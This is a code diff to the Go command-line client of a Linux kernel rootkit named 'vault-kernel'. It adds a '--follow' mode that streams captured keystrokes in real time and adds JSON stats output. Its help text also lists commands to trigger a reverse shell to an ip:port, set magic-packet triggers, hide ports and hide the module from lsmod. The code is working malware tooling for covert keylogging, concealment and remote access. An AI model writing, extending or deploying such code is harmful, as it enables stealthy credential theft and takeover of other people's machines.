@@ -2,16 +2,18 @@ package main
 
 import (
 	"encoding/binary"
+	"encoding/json"
 	"fmt"
 	"os"
 	"strconv"
 	"strings"
+	"time"
 	"unsafe"
 
 	"github.com/ruby570bocadito/vault-kernel/internal/vaultkernel"
 )
 
-const clientVersion = "3.4"
+const clientVersion = "3.5"
 
 const devicePath = "/dev/vault_kernel"
 
@@ -188,6 +190,32 @@ func keylogRead(f *os.File) error {
 	return nil
 }
 
+// keylogFollow polls KEYLOG_READ and streams new keystrokes as they
+// arrive.  The module's buffer shifts left when full, so a suffix
+// diff is printed when the common prefix breaks (buffer wrap).
+// Exits on Ctrl-C (default SIGINT handling).
+func keylogFollow(f *os.File, intervalMs int) error {
+	fmt.Printf("[*] Following keystroke log (poll %d ms) — Ctrl-C to stop\n", intervalMs)
+	prev := ""
+	for {
+		buf := make([]byte, 4096)
+		if _, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_KEYLOG_READ, unsafe.Pointer(&buf[0])); err != 0 {
+			return err
+		}
+		cur := strings.TrimRight(string(buf), "\x00")
+		if cur != prev {
+			if len(cur) >= len(prev) && strings.HasPrefix(cur, prev) {
+				fmt.Print(cur[len(prev):])
+			} else {
+				// Buffer wrapped: common prefix lost.
+				fmt.Print("\n" + cur)
+			}
+			prev = cur
+		}
+		time.Sleep(time.Duration(intervalMs) * time.Millisecond)
+	}
+}
+
 func keylogClear(f *os.File) error {
 	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_KEYLOG_CLEAR, unsafe.Pointer(nil))
 	if err != 0 {
@@ -267,6 +295,40 @@ func showStats(f *os.File) error {
 	} else {
 		fmt.Print(output)
 	}
+	return nil
+}
+
+// showStatsJSON re-emits the GET_STATS key=value report as JSON so
+// lab scripts can consume it without text munging. Numeric values
+// are converted to JSON numbers, the rest stay strings.
+func showStatsJSON(f *os.File) error {
+	buf := make([]byte, 4096)
+	if _, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_GET_STATS, unsafe.Pointer(&buf[0])); err != 0 {
+		return err
+	}
+	raw := map[string]string{}
+	for _, line := range strings.Split(strings.TrimRight(string(buf), "\x00"), "\n") {
+		line = strings.TrimSpace(line)
+		if i := strings.Index(line, "="); i > 0 {
+			raw[line[:i]] = line[i+1:]
+		}
+	}
+	if len(raw) == 0 {
+		return fmt.Errorf("module returned an empty stats report")
+	}
+	out := make(map[string]interface{}, len(raw))
+	for k, v := range raw {
+		if n, err := strconv.Atoi(v); err == nil {
+			out[k] = n
+		} else {
+			out[k] = v
+		}
+	}
+	j, err := json.MarshalIndent(out, "", "  ")
+	if err != nil {
+		return err
+	}
+	fmt.Println(string(j))
 	return nil
 }
 
@@ -405,10 +467,11 @@ Commands:
   unhide-port <port>      Reveal a hidden port
   list                    List all hidden items
   stats                   Show module stats (version, hooks, counts)
+  stats --json            Same, as machine-readable JSON
   shell <ip:port>         Trigger reverse shell
   magic <word>            Set magic packet trigger word
   magic-encode <word> <port>  Print the kill() trigger for a word+port
-  keylog                  Read captured keystrokes
+  keylog [--follow [ms]]  Read captured keystrokes (stream with --follow)
   keylog-clear            Clear keylogger buffer
   hide-module             Hide rootkit from lsmod
   unhide-module           Make rootkit visible in lsmod
@@ -530,6 +593,9 @@ func run() error {
 		return listHidden(f)
 
 	case "stats":
+		if len(os.Args) > 2 && os.Args[2] == "--json" {
+			return showStatsJSON(f)
+		}
 		return showStats(f)
 
 	case "shell":
@@ -553,6 +619,17 @@ func run() error {
 		return nil
 
 	case "keylog":
+		if len(os.Args) > 2 && os.Args[2] == "--follow" {
+			interval := 500
+			if len(os.Args) > 3 {
+				n, err := strconv.Atoi(os.Args[3])
+				if err != nil || n < 50 {
+					return fmt.Errorf("invalid interval: %s (milliseconds, min 50)", os.Args[3])
+				}
+				interval = n
+			}
+			return keylogFollow(f, interval)
+		}
 		return keylogRead(f)
 
 	case "keylog-clear":
